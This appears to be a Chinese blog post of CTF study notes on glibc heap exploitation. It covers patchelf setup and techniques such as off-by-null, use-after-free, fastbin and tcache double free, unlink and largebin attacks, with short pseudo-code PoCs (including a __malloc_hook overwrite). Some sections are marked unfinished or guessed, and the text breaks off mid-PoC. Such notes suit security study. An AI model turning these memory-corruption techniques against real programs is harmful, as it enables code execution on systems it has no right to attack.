<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 也可以</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
<h2 id="patch-elf文件">[1-3] patch elf文件</h2>
<blockquote>
<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
<code>ld-linux-x86-64.so.2</code>
等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
<p>tip2：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc.so.6 pwn</span><br></pre></td></tr></table></figure>
<h2 id="恢复-debug-symbol">[1-4] 恢复 debug symbol</h2>
<h3 id="patchelf-list-中有相关包">[1-4-1] patchelf list 中有相关包</h3>
<blockquote>
<p>其实没有相关包的话用最近版本的 libc 也能.debug</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载对应 libc 包</span></span><br><span class="line">./download xxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">复制 /libs/2.xx-xubuntuxx_xxx/.debug/.build-id 的绝对路径，在gdb时</span></span><br><span class="line">loadfolder /path/to/libs/2.xx-xubuntuxx_xxx/.debug/.build-id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果 download 拉不下来，去对应网站找带dbg（如libc6-dbg_2.23-0ubuntu3_i386.deb）的包下载下来，将/data/usr/lib/debug/.build-id复制到 /libs/2.xx-xubuntuxx_xxx/.debug 下即可</span></span><br></pre></td></tr></table></figure>
<h3 id="list-中没有相关包">[1-4-2] list 中没有相关包</h3>
<p>查看<a
href="https://www.jianshu.com/p/1a966b62b3d4">这个教程</a>编译源码来恢复符号</p>
<p><a href="https://www.cnblogs.com/LynneHuan/p/17822138.html">docker
恢复符号</a></p>
<h2 id="恢复源码与patchelf关系不大">[1-5]
恢复源码(与patchelf关系不大)</h2>
<p><a href="https://zhuanlan.zhihu.com/p/65873040">看这篇</a></p>
<h1 id="详解-申请与释放-chunk未完成">[2] 详解 '申请与释放
chunk'(未完成)</h1>
<h2 id="申请-chunk">[2-1] 申请 chunk</h2>
<ol start="0" type="1">
<li><p>如果是第一次申请，则 malloc 一块内存来存放
<code>tcache_perthread_struct</code></p></li>
<li><p>查看要申请的 chunk 的大小，记作 <code>SIZE</code></p></li>
<li><p>检查各种 bin</p>
<ol type="1">
<li>(libc2.26及之后) <code>SIZE</code> 属于 [0x0,small bin size)，检查
tcachebin，有合适的 chunk 则返回</li>
<li>根据版本有不同选择
<ol type="1">
<li>(libc2.26之前)<code>SIZE</code> 属于 [0x0,0x78]，检查
fastbins，有合适的 chunk 则检查 size 域是否正确，正确则返回</li>
<li>(libc2.26及之后)<code>SIZE</code> 属于 [0x0,0x78]，将对应 fastbin
一整条链挪进 tcachebin 的对应链上，并取出 newest_chunk 返回</li>
</ol></li>
<li>smallBin largeBin 还没学</li>
<li>检查 unsortedBin，如果 <code>SIZE</code> 小于 "unsortedbin 的某个
chunk 的 size"，则:
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回，剩下的部分叫做 last
remainder chunk</li>
</ol></li>
</ol></li>
<li><p>检查 topchunk，如果 <code>SIZE</code> 小于 "topchunk 的
size"，则:</p>
<ol type="1">
<li>以0x10为基本单位切割出申请的 chunk 并返回</li>
</ol></li>
<li><p>用 Brk 再拉几页内存出来，还没学</p></li>
</ol>
<h2 id="释放-chunk">[2-2] 释放 chunk</h2>
<ol type="1">
<li>查看要释放的 chunk 的大小，记作<code>SIZE</code></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 猜测，尚不确定</span><br><span class="line">n. 检查 prev_inuse 位，若为0，则:  </span><br><span class="line">    1. 如果 chunk 不在 fastbin/tcachebin，则前向合并，并继续递归检验 prev_inuse</span><br><span class="line">    2. 如果 chunk 在 fastbin/tcachebin，则获取前一个 chunk 的 size，并存到 prev_size 域</span><br></pre></td></tr></table></figure>
<h1 id="chunk-extend-and-overlapping">[3] chunk Extend and
Overlapping</h1>
<h2 id="分类">[3-1] 分类</h2>
<p>本质是通过修改 chunk_header 来实现用 chunk1 控制 chunk2
的内容的效果。分为前向和后向两种</p>
<h3 id="后向-overlap">[3-1-1] 后向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x21)---</span><br><span class="line">---chunk2(0x21)---</span><br></pre></td></tr></table></figure></p>
<p>本质：修改低地址 chunk1 的 size 域，在修改 chunk1 内容时会越界修改掉
chunk2 的内容</p>
<h3 id="前向-overlap">[3-1-2] 前向 Overlap</h3>
<p>堆区模型： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---chunk1(0x81)---</span><br><span class="line">---chunk2(0x21)---</span><br><span class="line">---chunk3(0x21)---</span><br><span class="line">---chunk4(0x81)---</span><br><span class="line">---chunk5(0x21)---防止 top_chunk 合并</span><br></pre></td></tr></table></figure></p>
<p>本质：修改高地址 chunk4 的 pre_inuse 域和 prev_size 域，通过 free 时
bins 的机制来进行前向合并 chunk1 ，从而再次 malloc 时可以控制中间的
chunk2 与 chunk3</p>
<h2 id="具体利用手法">[3-2] 具体利用手法</h2>
<h3 id="off-by-null">[3-2-1] off-by-null</h3>
<h4 id="概述">[3-2-1-1] 概述</h4>
<p><code>off-by-null</code>
指的是程序在写入堆的时候，会在输入字符的最后用<code>'\x00'</code>截断</p>
<p>通过申请 xxx8h 大小的 chunk，当我们输入 xxx8 个字节时，程序会将下一个
chunk 的 size 域的低一个字节覆盖为0，</p>
<p>这样的操作会让 prev_inuse 位置零，使程序误以为前一个 chunk
已经被释放，从而与前 n 个 chunk 发生合并</p>
<h4 id="poc">[3-2-1-2] POC</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 0 0x91 </span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment"># 1 0x21</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2 0x91</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3 0x21 防止合并</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xb0</span>) <span class="comment"># 0x20 + 0x90 = 0xb0</span></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># show(0) 可以 leak main_arena</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># alloc(4,0xa0) 可以切割 chunk0-chunk2，从而修改 chunk1，</span></span><br><span class="line"><span class="comment"># 进而造成 tcachebin poisoning / fastbin attack</span></span><br></pre></td></tr></table></figure>
<h1 id="use-after-free">[4] Use After Free</h1>
<h2 id="概述-1">[4-1] 概述</h2>
<blockquote>
<p>libc2.26 - libc2.31，主要是 tcachebin UAF</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin -&gt; UAF</p>
<h1 id="double-free">[5] Double Free</h1>
<h2 id="概述-2">[5-1] 概述</h2>
<blockquote>
<p>libc2.27之前，主要是 fastbin double free</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Fastbin</p>
<blockquote>
<p>libc2.27-2.28，主要是 tcachebin double free</p>
</blockquote>
<blockquote>
<p>libc2.29-libc2.31，tcachebin加入了检查机制，所以仍然考虑用
fastbin/smallbin</p>
</blockquote>
<p>见 Kinds of Bin -&gt; Tcachebin</p>
<h1 id="unlink">[6] Unlink</h1>
<h2 id="利用条件">[6-1] 利用条件</h2>
<ol type="1">
<li><p>free 的 <code>chunkC</code> 前后 chunk 的 fd/bk 可以被修改</p>
<ol type="1">
<li><p>UAF，free 以后修改 fd/bk</p></li>
<li><p>堆溢出，伪造 chunk，修改 fd/bk 的同时修改 <code>chunk</code> 的
prev_size 和 prev_inuse</p></li>
</ol></li>
<li><p>没见过太多案例不太会概括这一点</p>
<ol type="1">
<li>pie 没开，bss 段的 heap_list 可以被拿来当做 fd/bk</li>
</ol></li>
</ol>
<h2 id="原理">[6-2] 原理</h2>
<p>ctfwiki 上的 FD BK fd bk 感觉写的乱七八糟的，重新整理一下思路</p>
<p>unlink 概括来讲，就是利用 free
时的机制，实现任意地址写非任意值的技术</p>
<h3 id="触发-unlink">[6-2-1] 触发 unlink</h3>
<ol type="1">
<li><p>在释放 size 大于 smallbin 最小值的 chunkC 时，ptmalloc 会检查
chunkC 物理相邻的前后两个 chunk
是否正在被使用，如果没被使用，则会触发前向/后向合并，从而触发 unlink</p>
<ol type="1">
<li><p>前向合并：chunkC 的 prev_size 为前一个 chunk 的 size，且 chunkC
的 prev_inuse 位置零</p></li>
<li><p>后向合并：chunkC 的后一个 chunk 已经在 binlist 当中</p></li>
</ol></li>
</ol>
<h3 id="古早版本">[6-2-2] 古早版本</h3>
<p>假设在一个双向链表 bin 中，有 BK &lt;=&gt; CUR &lt;=&gt; FD</p>
<p>三个 chunk 的关系为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BK.fd == &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk == &amp;(BK.prev_size)</span><br><span class="line">CUR.fd == &amp;(FD.prev_size)</span><br><span class="line">FD.bk == &amp;(CUR.prev_size)</span><br></pre></td></tr></table></figure>
<center>
<img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/figure/unlink_smallbin_intro.png" width=370 height=290 />
</center>
<p>在<strong>古早</strong>的版本中，unlink 的具体过程为
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CUR.bk-&gt;fd = CUR.fd # CUR 的后一个 chunk 的 fd 指针指向 CUR 的前一个 chunk</span><br><span class="line">CUR.fd-&gt;bk = CUR.bk # CUR 的前一个 chunk 的 bk 指针指向 CUR 的后一个 chunk</span><br></pre></td></tr></table></figure></p>
<p>如果我们修改 CUR 的 fd 和 bk 指针，就可以实现
<code>Any address write</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SIZE 在32位为 4，64位为8</span></span><br><span class="line"><span class="comment">// target_addr + 0*SIZE = &amp;(fakechunk.prev_size)</span></span><br><span class="line"><span class="comment">// target_addr + 1*SIZE = &amp;(fakechunk.size)</span></span><br><span class="line"><span class="comment">// target_addr + 2*SIZE = &amp;(fakechunk.fd)</span></span><br><span class="line"><span class="comment">// target_addr + 3*SIZE = &amp;(fakechunk.bk)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 CUR 的 fd 和 bk 指针</span></span><br><span class="line">CUR.fd = target_addr - <span class="number">3</span>*SIZE</span><br><span class="line">CUR.bk = expect_value</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.fd-&gt;bk = CUR.bk</span></span><br><span class="line">*(target_addr - <span class="number">3</span>*SIZE + <span class="number">3</span>*SIZE) = expect_value + <span class="number">2</span>*SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment">// CUR.bk-&gt;fd = CUR.fd   ---&gt;   要求 expect_value + 8 指向的内存可写</span></span><br><span class="line">*(expect_value + <span class="number">2</span>*SIZE) = target_addr - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure>
<h3 id="加入-check-以后">[6-2-3] 加入 check 以后</h3>
<ol type="1">
<li><p>check1</p>
<ol type="1">
<li><p>check <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line"><span class="comment">// 省流版: </span></span><br><span class="line"><span class="comment">// CUR 的 fd 指向的 chunk 的 bk 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="comment">// CUR 的 bk 指向的 chunk 的 fd 必须存的是 CUR 的地址</span></span><br><span class="line"><span class="keyword">if</span> ( !( CUR.fd-&gt;bk == &amp;(CUR.prev_size) &amp;&amp; CUR.bk-&gt;fd == &amp;(CUR.prev_size) ) )</span><br><span class="line">    malloc_printerr(...)</span><br></pre></td></tr></table></figure></p></li>
<li><p>bypass <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 让 CUR 的 fd 和 bk 指针都指向 CUR 自己</span></span><br><span class="line">CUR.fd = &amp;(CUR.prev_size)</span><br><span class="line">CUR.bk = &amp;(CUR.prev_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">// check 时</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = CUR</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = CUR</span><br><span class="line"></span><br><span class="line"><span class="comment">// unlink</span></span><br><span class="line">CUR.fd-&gt;bk = (&amp;(CUR.prev_size))-&gt;bk = &amp;(CUR.prev_size) + <span class="number">2</span>*SIZE</span><br><span class="line">CUR.bk-&gt;fd = (&amp;(CUR.prev_size))-&gt;fd = &amp;(CUR.prev_size) - <span class="number">3</span>*SIZE</span><br></pre></td></tr></table></figure> 这样虽然不能实现任意地址写，但是也可以让
CUR 的 fd 和 bk 指针指向不正确的位置</p></li>
</ol></li>
</ol>
<h1 id="series-of-bin">[7] Series of Bin</h1>
<h2 id="tcachebin">[7-1] Tcachebin</h2>
<h3 id="概述-3">[7-1-1] 概述</h3>
<ol type="1">
<li>Tcachebin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Tcachebin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">    ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak">[7-1-2] Leak</h3>
<h3 id="write">[7-1-3] Write</h3>
<h4 id="uaf">[7-1-3-1] UAF</h4>
<blockquote>
<p>Libc: 2.26 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>UAF</li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>Tcachebin 跟筛子没什么区别，通过 UAF 修改 newest_chunk 的 fd 指针为
Any address，再通过两次 malloc 就可以在 Any address 处申请到一个 chunk
供我们使用</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> alloc(chunk0)</span><br><span class="line">   alloc(chunk1)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> free(chunk0)</span><br><span class="line">   free(chunk1)</span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; chunk0</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> edit(chunk1,payload=address_to_malloc) </span><br><span class="line"><span class="comment"># 做完这一步，tcachebin[size]: chunk1 -&gt; address_to_malloc</span></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> alloc(chunk2) <span class="comment"># chunk2 = chunk1</span></span><br><span class="line">   alloc(chunk3) <span class="comment"># chunk3 = address_to_malloc</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 Elden Ring Ⅱ</a></li>
</ol>
<h4 id="stash-double-free">[7-1-3-2] Stash Double Free</h4>
<blockquote>
<p>Libc: 2.27 - 2.31</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>7个 tcachebin chunk，2个 fastbin chunk，bins 构造完成后至少可以
alloc 10次</p></li>
<li><p>free 后还能再 free 同一个 chunk</p></li>
</ol>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li><p>2.27之后，tcachebin 加入了 key 值检验，因此直接劫持 tcachebin
链比较困难(需要伪造 key 值)。</p></li>
<li><p>(具体是 stash 机制，我是按下面这样理解的)但当 tcachebin
某一条链的 chunk 全部取出，且对应大小的 fastbin 上仍有 chunk，ptmalloc
会将 fastbin 对应链上的全部 chunk 取出，并按 fastbin 顺序装载到
tcachebin 中。此时 ptmalloc 不会检测 fastbin 的全部 chunk 是否合法，并且
ptmalloc 还会为每个 chunk 构造合法 key 值，所以我们可以先劫持 fastbin
链，然后清空 tcachebin 后劫持 tcachebin 链。</p></li>
<li><p>在检查 key 值之后，从 tcachebin 中申请 chunk
的检测机制比较薄弱，不需要考虑 fd 指向的地址的 size 域是否合法</p></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>申请9个同样大小的 chunk，依次释放，再释放一次 chunk7
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    alloc(i) <span class="comment"># 0-6 tcahcebin chunks || 7,8 fastbin chunks</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    free(i) </span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># fastbin: chunk7 -&gt; chunk8 -&gt; chunk7</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请7个 chunk，清空 tcachebin 链。再申请 chunk7，将 fastbin
中的所有 chunk 转移到 tcachebin 中. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    alloc(i)</span><br><span class="line"></span><br><span class="line">alloc(idx=<span class="number">7</span>,content=address_to_alloc)</span><br><span class="line"><span class="comment"># 此时 tcachebin: chunk8 -&gt; chunk7 -&gt; address_to_alloc</span></span><br></pre></td></tr></table></figure></p></li>
<li><p>申请3个 chunk，此时我们就可以通过改变 chunk9 的值，来 write
任意位置了. <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">8</span>)</span><br><span class="line">alloc(<span class="number">7</span>)</span><br><span class="line">alloc(<span class="number">9</span>,content=anything_to_write)</span><br></pre></td></tr></table></figure></p></li>
</ol>
<blockquote>
<p>例题:</p>
</blockquote>
<ol type="1">
<li><a href="">杭电hgame2024-week2 fastnote</a></li>
</ol>
<h2 id="fastbin">[7-2] Fastbin</h2>
<h3 id="概述-4">[7-2-1] 概述</h3>
<ol type="1">
<li>Fastbin 为 LIFO 单向链表，如下</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">fastbin</span>: (头节点)<span class="title function_">newest_chunk</span>(first out) -&gt; ... </span><br><span class="line">  ... -&gt; (尾节点)<span class="title function_">oldest_chunk</span>(last out)</span><br></pre></td></tr></table></figure>
<h3 id="leak-1">[7-2-2] Leak</h3>
<h3 id="write-1">[7-2-3] Write</h3>
<h4 id="double-free-1">[7-2-3-1] Double Free</h4>
<blockquote>
<p>Libc: 2.27之前</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li>free 后还能再 free 同一个 chunk</li>
</ol>
<blockquote>
<p>fastbin 相关特性:</p>
</blockquote>
<ol type="1">
<li><code>free</code>: 在 free chunk 到 fastbin 的过程中，会有以下
check：
<ol type="1">
<li>检测这个 chunk 和尾节点是否是同一个
chunk，如果是，则触发<code>Error in './vuln': double free or corruption (fasttop): 0x17170c0</code></li>
</ol></li>
<li><code>malloc</code>: 从 fastbin 申请 chunk 时，会有以下 check:
<ol type="1">
<li>检测这个 chunk 的 fd 指向的内存的 size 是否符合所属
fastbin，如果不属于，则触发<code>Error in './vuln': malloc(): memory corruption (fast): 0x7f4cf12d6afe</code></li>
</ol></li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<ol type="1">
<li><p>构建 fastbin: chunk1 -&gt; chunk2 -&gt; chunk1<br />
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(chunk1)，同时修改 chunk1 的 fd, 此时 fastbin 中构造为
chunk2 -&gt; chunk1 -&gt; address（address 有如下选择）</p>
<ol type="1">
<li>libc.sym['__malloc_hook'] - 0x23 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pd = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"><span class="comment"># 注意不要把 &#x27;\n&#x27; 也当做 payload 传过去了</span></span><br><span class="line">alloc(<span class="number">1</span>,payload=pd)</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>malloc(chunk2), malloc(chunk1) <figure class="highlight py"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p>malloc(address)，同时修改 address
处的内容，对应<code>'2.'</code>中的不同选择，有不同的填充方式</p>
<ol type="1">
<li>payload = b'a'*19 + one_gadget <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">mallochook-<span class="number">0x23</span>      prev_size      <span class="number">0x000000000000007f</span></span><br><span class="line">mallochook-<span class="number">0x13</span>  <span class="number">0x6161616161616161</span> <span class="number">0x6161616161616161</span></span><br><span class="line">mallochook-<span class="number">0x03</span>  0xXXXXXXXXXX616161 0x0000000000XXXXXX</span><br><span class="line">                            ^</span><br><span class="line">                            |</span><br><span class="line">                    正好是__malloc_hook的位置</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<blockquote>
<p>例题</p>
</blockquote>
<ol type="1">
<li><p><a
href="https://heygap.github.io/2023/08/14/Pwn%20-%20Practice/#more">BUUCTF
babyheap_0ctf_2017</a></p></li>
<li><p><a href="">杭电hgame2024-week2 old_fastnote</a></p></li>
</ol>
<h2 id="unsortedbin">[7-3] Unsortedbin</h2>
<h3 id="leak-2">[7-3-1] leak</h3>
<blockquote>
<p>Libc: Any</p>
</blockquote>
<blockquote>
<p>应用条件:</p>
</blockquote>
<ol type="1">
<li><p>UAF</p></li>
<li><p>alloc 至少不会覆盖 bk</p></li>
</ol>
<p>当unsortedbin中有且仅有一个chunk时，</p>
<p>该chunk的fd和bk会指向 &amp;main_arena + 96，</p>
<p>貌似libc2.31是96，libc2.23是88，</p>
<p>具体做题用 pwndbg 看最低四位是 0x8 还是
0x0，0x8-&gt;88,0x0-&gt;96</p>
<p>而这个地址可以用ida查看对应libc的 malloc_trim 函数找到，从而帮助计算
libc_base.</p>
<p>当然这个地址也是 &amp;__malloc_hook + 0x10，具体看下面的代码注释.</p>
<p>如果我们把 unsortedbin 中唯一一个 chunk 记作 chunk0，则:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存中的 main_arena 地址，一般为0x7f...</span></span><br><span class="line">main_arena = chunk0.fd - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 libc 基址:</span></span><br><span class="line"><span class="comment"># main_arena 在 libc 中的偏移，正好等于 </span></span><br><span class="line"><span class="comment"># __malloc_hook 的偏移 + 0x10。</span></span><br><span class="line"><span class="comment"># 即 &amp;main_arena = &amp;__malloc_hook + 0x10。</span></span><br><span class="line">libc_base = main_arena - (ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>).sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们也可以直接用 IDA 打开 libc,</span></span><br><span class="line"><span class="comment"># 找到 __malloc_trim 函数,</span></span><br><span class="line"><span class="comment"># 直接在 22 行附近找到类似于</span></span><br><span class="line"><span class="comment"># _R15 = &amp;dword_1ECB80 的语句,</span></span><br><span class="line"><span class="comment"># 这里 main_arena 的偏移就是 0x1ECB80</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x1ECB80</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>bypass</p>
</blockquote>
<ol type="1">
<li><code>ssize_t read(int fd, void *buf, size_t nbytes)</code>会用''填充不够
nbytes 的部分，因此我们在 <code>alloc</code> 或者 <code>edit</code>
的时候注意 nbytes = 0x08 即可，这样不会覆盖 bk 的 &amp;main_arena</li>
</ol>
<h3 id="write-2">[7-3-2] write</h3>
<h4 id="direct">[7-3-2-1] Direct</h4>
<blockquote>
<p>Libc: 2.23</p>
</blockquote>
<blockquote>
<p>相关特性:</p>
</blockquote>
<ol type="1">
<li>低 libc 版本的 unsortedbin 可以像 tcachebin
一样，通过伪造链来申请一个 fake_chunk</li>
</ol>
<blockquote>
<p>POC:</p>
</blockquote>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初状态 unsortedbin --&gt; chunk_victim  </span></span><br><span class="line">&gt; 此时我们令chunk_victim.bk = fake_chunk_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># 末状态 unsortedbin --&gt; chunk_victim --&gt; fake_chunk</span></span><br><span class="line">&gt; 连续申请两个chunk即可申请到fake_chunk</span><br></pre></td></tr></table></figure>
<h2 id="largebin-attack">[7-4] Largebin Attack</h2>
<h3 id="概述-5">[7-4-1] 概述</h3>
<p>Largebin 是 FIFO 的双向链表，chunk 结构为👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------------------------------------------------+</span><br><span class="line">|        prev_size       |      size       |0|0|1|| </span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|           fd           |           bk           |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|       fd_nextsize      |       bk_nextsize      |</span><br><span class="line">|------------------------|------------------------|</span><br><span class="line">|                    user_data                    |</span><br><span class="line">|                      . . .                      |</span><br><span class="line">+-------------------------------------------------+</span><br></pre></td></tr></table></figure></p>
<h3 id="leak-3">[7-4-2] leak</h3>
<h3 id="write-3">[7-4-3] write</h3>
<h4 id="对-libc-有要求">[7-4-3-1] 对 libc 有要求</h4>
<blockquote>
<p>libc: 2.30 及以前？</p>
</blockquote>
<h4 id="对-libc-没要求">[7-4-3-2] 对 libc 没要求</h4>
<blockquote>
<p>libc: Any</p>
</blockquote>
<p>概述：</p>
<p>通过修改 largebin 中的 bk_nextsize 为 target_addr - 0x20，可以在
target_addr 处写一个堆地址</p>
<p>POC： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">alloc(<span class="number">0x500</span>)  <span class="comment">// chunk1</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap1 防止合并</span></span><br><span class="line">alloc(<span class="number">0x510</span>)  <span class="comment">// chunk2</span></span><br><span class="line">alloc(<span class="number">0x10</span>)   <span class="comment">// gap2 防止合并</span></span><br><span class="line"><span class="built_in">free</span>(chunk1)  <span class="comment">// chunk1 进入 unsortedbin</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// chunk1 进入 largebin</span></span><br><span class="line"><span class="built_in">free</span>(chunk2)  <span class="comment">// chunk2 进入 unsortedbin</span></span><br><span class="line">chunk1.bk_nextsize = target_addr - <span class="number">0x20</span> <span class="comment">// UAF等方法修改 chunk</span></span><br><span class="line">alloc(<span class="number">0x520</span>)  <span class="comment">// 